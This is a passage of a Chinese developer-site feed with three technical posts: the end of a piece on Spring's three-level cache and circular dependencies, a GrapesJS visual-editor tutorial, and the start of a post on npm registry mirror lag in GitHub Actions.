                            <span class="hljs-comment">// 5. 将早期Bean存入二级缓存，同时移除三级缓存的工厂</span>
                            <span class="hljs-keyword">this</span>.earlySingletonObjects.put(beanName, singletonObject);
                            <span class="hljs-keyword">this</span>.singletonFactories.remove(beanName);
                        }
                    }
                }
            }
        }
    }
    <span class="hljs-keyword">return</span> singletonObject;
}
</code></pre>
<h4 data-id="heading-5">循环依赖解决流程（以A←→B循环依赖为例）</h4>
<ol>
<li>
<p>Spring创建Bean A，完成实例化后，将A的创建工厂存入<strong>三级缓存</strong>；</p>
</li>
<li>
<p>初始化A时，发现需要注入Bean B，触发B的创建流程；</p>
</li>
<li>
<p>Spring创建Bean B，完成实例化后，将B的创建工厂存入<strong>三级缓存</strong>；</p>
</li>
<li>
<p>初始化B时，发现需要注入Bean A，调用<code>getSingleton(A)</code>：</p>
<ol>
<li>一级缓存无A（未初始化完成），二级缓存无A；</li>
<li>从三级缓存获取A的工厂，生成A的早期引用，存入<strong>二级缓存</strong>；</li>
<li>将A的早期引用返回给B，B完成初始化，存入<strong>一级缓存</strong>；</li>
</ol>
</li>
<li>
<p>A拿到B的成熟引用（一级缓存），完成自身初始化，存入<strong>一级缓存</strong>；</p>
</li>
<li>
<p>最终A、B均存入一级缓存，循环依赖问题解决。</p>
</li>
</ol>
<h3 data-id="heading-6">四、缓存操作加锁的原因</h3>
<p>缓存操作时对<code>singletonObjects</code>（一级缓存）加锁，核心目的是：</p>
<ol>
<li>
<p><strong>保证</strong> <strong>缓存一致性</strong>：防止多线程并发操作缓存时，出现“读取到不完整数据”“重复创建Bean”等一致性问题；</p>
</li>
<li>
<p><strong>避免</strong> <strong>死锁</strong> <strong>风险</strong>：统一锁定一级缓存，而非为三级缓存分别加锁，减少多锁嵌套导致的死锁概率；</p>
</li>
<li>
<p><strong>双重检查保障</strong>：加锁后的“双重检查”逻辑，能有效防止并发场景下的缓存穿透。</p>
</li>
</ol>
<p>那么 三级缓存一定能够解决循环依赖吗 答案是不能完全解决</p>
<p>在构造器注入产生的循环依赖 则需要采用其他方法</p>
<h3 data-id="heading-7">五、三级缓存的场景限制：无法解决构造器注入循环依赖</h3>
<p>三级缓存仅能解决<strong>字段注入/setter注入</strong>的循环依赖，无法解决<strong>构造器注入</strong>的循环依赖，原因如下：</p>
<ol>
<li>Spring Bean的创建流程中，<strong>构造器注入发生在实例化阶段</strong>（调用构造方法时），此时Bean尚未完成实例化，无法生成早期引用；</li>
<li>三级缓存的核心逻辑是“实例化后、初始化前”提前暴露引用，而构造器注入的循环依赖发生在实例化阶段，缓存机制尚未介入。</li>
</ol>
<h4 data-id="heading-8">构造器注入循环依赖的解决方案</h4>
<p>通过Spring提供的<code>@Lazy</code>注解延迟构造器注入的Bean初始化：</p>
<ul>
<li><code>@Lazy</code>会让Spring在构造器注入时，返回一个Bean的代理对象（而非真实对象）；</li>
<li>真实对象的创建会延迟到首次使用时，从而打破构造器阶段的循环依赖。</li>
</ul>
<p>示例：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Component</span>
public class A {
    <span class="hljs-comment">// 构造器注入B时添加@Lazy，延迟B的初始化</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">A</span>(<span class="hljs-variable">@Lazy</span> B b) {
        <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.b</span> = <span class="hljs-selector-tag">b</span>;
    }
}

@<span class="hljs-selector-tag">Component</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">B</span> {
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">B</span>(A a) {
        <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.a</span> = <span class="hljs-selector-tag">a</span>;
    }
}
</code></pre>
<h4 data-id="heading-9">总结</h4>
<ol>
<li>三级缓存的核心是通过“实例化后提前暴露早期引用”，解决字段/setter注入的循环依赖；</li>
<li>缓存操作加锁是为了保证并发安全，统一锁一级缓存可避免死锁；</li>
<li>三级缓存无法解决构造器注入循环依赖，需通过<code>@Lazy</code>注解延迟初始化解决。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GrapesJS 完全指南：从零构建你的可视化拖拽编辑器]]></title>    <link>https://juejin.cn/post/7594303825013260303</link>    <guid>https://juejin.cn/post/7594303825013260303</guid>    <pubDate>2026-01-12T17:14:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594303825013260303" data-draft-id="7594315259462434851" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GrapesJS 完全指南：从零构建你的可视化拖拽编辑器"/> <meta itemprop="keywords" content="前端,JavaScript,前端框架"/> <meta itemprop="datePublished" content="2026-01-12T17:14:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xiayuguo"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476706589"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GrapesJS 完全指南：从零构建你的可视化拖拽编辑器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476706589/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xiayuguo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T17:14:38.000Z" title="Mon Jan 12 2026 17:14:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>随着“低代码”和“无代码”趋势的兴起，为用户提供一个直观的拖拽式（Drag &amp; Drop）编辑器已成为许多企业级应用的标准配置。而在开源世界中，<strong>GrapesJS</strong> 无疑是实现这一功能最强大的框架。</p>
<p>本文将带你从底层架构到代码实现，一步步掌握如何构建一个属于自己的可视化编辑器。</p>
<hr/>
<h2 data-id="heading-0">一、 为什么选择 GrapesJS？</h2>
<p>在选择可视化编辑器方案时，开发者通常会在 <code>Quill</code>（侧重富文本）、<code>Elementor</code>（侧重 WordPress）和 <code>GrapesJS</code> 之间权衡。</p>
<p>GrapesJS 的核心优势在于它的**“框架属性”**：</p>
<ol>
<li><strong>零依赖 UI</strong>：它不强制你使用特定的 UI 库（React/Vue 均可集成）。</li>
<li><strong>高度模块化</strong>：内置了块管理器、样式管理器、图层管理器等，且均可自定义。</li>
<li><strong>强大的插件生态</strong>：支持 MJML（邮件）、网页、甚至是移动端页面的快速搭建。</li>
</ol>
<hr/>
<h2 data-id="heading-1">二、 GrapesJS 核心架构解析</h2>
<p>在动手写代码前，理解 GrapesJS 的“四梁八柱”至关重要：</p>





























<table><thead><tr><th><strong>模块</strong></th><th><strong>功能描述</strong></th></tr></thead><tbody><tr><td><strong>Blocks (块)</strong></td><td>编辑器的“素材库”，用户拖入画布的最小单元。</td></tr><tr><td><strong>Components (组件)</strong></td><td>画布中的实时元素，拥有自己的属性和行为。</td></tr><tr><td><strong>Styles (样式)</strong></td><td>对应 CSS，控制颜色、布局、间距等。</td></tr><tr><td><strong>Traits (特征)</strong></td><td>对应 HTML 属性，如 <code>&lt;a&gt;</code> 标签的 <code>href</code> 或图片的 <code>alt</code>。</td></tr><tr><td><strong>Storage (存储)</strong></td><td>决定如何将编辑结果保存到数据库或本地。</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">三、 动手实战：从零开始初始化</h2>
<h3 data-id="heading-3">1. 环境准备</h3>
<p>你可以通过 NPM 安装，但在本指南中，我们使用 CDN 快速搭建原型。</p>
<p>HTML</p>
<pre><code class="hljs language-ini" lang="ini">&lt;link <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"https://unpkg.com/grapesjs/dist/css/grapes.min.css"</span>&gt;
&lt;script <span class="hljs-attr">src</span>=<span class="hljs-string">"https://unpkg.com/grapesjs"</span>&gt;&lt;/script&gt;

&lt;div <span class="hljs-attr">id</span>=<span class="hljs-string">"gjs"</span>&gt;&lt;/div&gt;
</code></pre>
<h3 data-id="heading-4">2. 核心初始化代码</h3>
<p>JavaScript</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">editor</span> = grapesjs.<span class="hljs-title function_ invoke__">init</span>({
  <span class="hljs-attr">container</span>: <span class="hljs-string">'#gjs'</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-string">'100vh'</span>,
  <span class="hljs-attr">width</span>: <span class="hljs-string">'auto'</span>,
  // 禁止从已有的 HTML 元素自动载入
  <span class="hljs-attr">fromElement</span>: <span class="hljs-literal">false</span>,
  // 存储设置
  <span class="hljs-attr">storageManager</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'local'</span> }, 
  // 定义面板（Panels）
  <span class="hljs-attr">panels</span>: { <span class="hljs-attr">defaults</span>: [] }, 
});
</code></pre>
<hr/>
<h2 data-id="heading-5">四、 深度定制：让编辑器“好用”起来</h2>
<p>一个空画布是没有意义的，我们需要为其添加工具。</p>
<h3 data-id="heading-6">第一步：配置块管理器 (Block Manager)</h3>
<p>块是用户的创作起点。我们可以定义一段简单的 HTML。</p>
<p>JavaScript</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">editor</span><span class="hljs-selector-class">.Blocks</span><span class="hljs-selector-class">.add</span>(<span class="hljs-string">'my-first-block'</span>, {
  label: '简单文本',
  <span class="hljs-attribute">content</span>: <span class="hljs-string">'&lt;div class="my-block"&gt;这是我的第一个自定义块&lt;/div&gt;'</span>,
  <span class="hljs-attribute">attributes</span>: { <span class="hljs-attribute">class</span>: <span class="hljs-string">'gjs-fonts gjs-f-b1'</span> } <span class="hljs-comment">// 图标样式</span>
});
</code></pre>
<h3 data-id="heading-7">第二步：启用样式管理器 (Style Manager)</h3>
<p>没有样式管理器，用户无法调整布局。GrapesJS 允许你分组定义 CSS 属性。</p>
<p>JavaScript</p>
<pre><code class="hljs language-php" lang="php">editor.<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'load'</span>, () =&gt; {
  editor.StyleManager.<span class="hljs-title function_ invoke__">addSector</span>(<span class="hljs-string">'layout'</span>, {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'布局设置'</span>,
    <span class="hljs-attr">open</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">buildProps</span>: [<span class="hljs-string">'width'</span>, <span class="hljs-string">'height'</span>, <span class="hljs-string">'margin'</span>, <span class="hljs-string">'padding'</span>, <span class="hljs-string">'display'</span>],
  });
});
</code></pre>
<h3 data-id="heading-8">第三步：保存与导出数据</h3>
<p>GrapesJS 最强大的地方在于它能将复杂的 DOM 转化为干净的 JSON 数据。</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">// 获取 HTML 和 CSS
const <span class="hljs-attr">html</span> = editor.getHtml()<span class="hljs-comment">;</span>
const <span class="hljs-attr">css</span> = editor.getCss()<span class="hljs-comment">;</span>

// 或者获取 JSON 对象（推荐用于保存到数据库，方便二次编辑）
const <span class="hljs-attr">projectData</span> = editor.getProjectData()<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">五、 进阶技巧：自定义组件 (Custom Components)</h2>
<p>如果你需要更高级的功能（例如：点击按钮触发弹窗），你需要定义自定义组件。</p>
<p>JavaScript</p>
<pre><code class="hljs language-php" lang="php">editor.Components.<span class="hljs-title function_ invoke__">addType</span>(<span class="hljs-string">'click-component'</span>, {
  <span class="hljs-attr">model</span>: {
    <span class="hljs-attr">defaults</span>: {
      <span class="hljs-attr">tagName</span>: <span class="hljs-string">'button'</span>,
      <span class="hljs-attr">draggable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">droppable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">traits</span>: [<span class="hljs-string">'id'</span>, <span class="hljs-string">'title'</span>],
      <span class="hljs-attr">attributes</span>: { <span class="hljs-attr">class</span>: <span class="hljs-string">'btn-primary'</span> },
      <span class="hljs-attr">script</span>: function() {
        this.<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">'click'</span>, () =&gt; <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">'你点击了组件！'</span>));
      }
    }
  }
});
</code></pre>
<hr/>
<h2 data-id="heading-10">六、 总结与最佳实践</h2>
<p>构建一个完善的可视化编辑器不仅仅是引入一个库。在生产环境下，你还需要考虑：</p>
<ul>
<li><strong>资源管理</strong>：用户上传的图片存放在哪里？</li>
<li><strong>权限控制</strong>：哪些组件不允许特定用户修改？</li>
<li><strong>响应式预览</strong>：确保用户编辑的页面在手机端也能完美显示。</li>
</ul>
<p>GrapesJS 提供了极高的自由度，但也意味着它需要开发者投入时间去配置和打磨 UI。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[不要在 github action 内使用 npm 的淘宝镜像源]]></title>    <link>https://juejin.cn/post/7594309641867165734</link>    <guid>https://juejin.cn/post/7594309641867165734</guid>    <pubDate>2026-01-12T18:19:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594309641867165734" data-draft-id="7594301878827548710" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="不要在 github action 内使用 npm 的淘宝镜像源"/> <meta itemprop="keywords" content="前端,GitHub"/> <meta itemprop="datePublished" content="2026-01-12T18:19:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ruanCat"/> <meta itemprop="url" content="https://juejin.cn/user/2406144257559271"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            不要在 github action 内使用 npm 的淘宝镜像源
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2406144257559271/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ruanCat
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T18:19:50.000Z" title="Mon Jan 12 2026 18:19:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>摘要</strong>：</p>
<p>淘宝镜像源（npmmirror）的包版本同步存在滞后，在 GitHub Action 工作流中使用可能导致构建失败。当依赖链中某个包需要刚发布的新版本时，淘宝镜像源可能尚未同步，从而触发 <code>ERR_PNPM_NO_MATCHING_VERSION</code> 错误。解决方案是在 GitHub Action 中强制使用官方 npm 镜像源：通过设置 <code>NPM_CONFIG_REGISTRY</code> 环境变量，并在 pnpm 安装命令中显式指定 <code>--registry https://registry.npmjs.org</code>。</p>
</blockquote>
<p>注意看这个极端的情况，在特定时间内，分别运行以下命令：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm v @typescript-eslint/scope-manager version --registry https://registry.npmmirror.com/
pnpm v @typescript-eslint/scope-manager version --registry https://registry.npmjs.org/
</code></pre>
<p>不同镜像源的版本号完全对不上，最新版本的依赖对不上。淘宝镜像的依赖包版本，必定是落后于官方镜像版本的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/401477e17d474f178ad43c95f1447442~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768846790&amp;x-signature=vOJZy2jipAdMO24ZEecVgWHixJQ%3D" alt="2026-01-13-01-49-29" loading="lazy"/></p>
<p>某些对依赖版本很严格的包，在 github action 工作流内，会因为在淘宝镜像找不到最新版本包，而导致构建错误，比如以下情况：</p>
<pre><code class="hljs language-log" lang="log">  ERR_PNPM_NO_MATCHING_VERSION  No matching version found for @typescript-eslint/scope-manager@8.53.0 while fetching it from https://registry.npmmirror.com/

  This error happened while installing the dependencies of @unocss/eslint-plugin@66.5.12
   at @typescript-eslint/utils@8.53.0

  The latest release of @typescript-eslint/scope-manager is "8.52.0".

  Other releases are:
    * canary: 8.52.1-alpha.13
    * rc-v: 6.0.0-alpha.58
    * rc-v4: 4.0.0-alpha.16
    * rc-v5: 5.0.0-alpha.42
    * rc-v6: 7.0.0-alpha.0
    * rc-v8: 8.0.0-alpha.62

  If you need the full list of all 3762 published versions run "$ pnpm view @typescript-eslint/scope-manager versions".
</code></pre>
<p>这段日志的意思就是说，在 <code>https://registry.npmmirror.com/</code> 淘宝源内，找不到 <code>8.53.0</code> 版本的 <code>@typescript-eslint/scope-manager</code> 包，只能找到 <code>8.52.0</code> 版本的包。而 <code>@unocss/eslint-plugin@66.5.12</code> 又需要最新版本的 <code>@typescript-eslint/scope-manager</code> 包。</p>
<p>这个包对于我现在的时间来说，是刚刚发布的新包。淘宝源还来不及做出同步。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc2ff0044f154c798192fd2466408c77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768846790&amp;x-signature=fYa5ufSxT5fVlxh5rAJF9KXAR2E%3D" alt="2026-01-13-01-55-13" loading="lazy"/></p>
<p>所以在 github action 内，真的不应该用淘宝镜像源，应该直接用官方镜像源，直接用最新的包版本。</p>
<h2 data-id="heading-0">修改出错的 github action 工作流</h2>
<ol>
<li>整个任务直接指定环境变量： <code>NPM_CONFIG_REGISTRY</code>。</li>
<li>由于使用的 <code>pnpm/action-setup</code> 工作流和 pnpm+monorepo 的架构，所以在<code>递归安装子包依赖</code>和<code>安装全局依赖</code>的时候，需要分别写两段独立的参数。</li>
</ol>
<p>如图所示，安装依赖的时候有两段独立的命令，所以需要分别设置镜像源。</p>
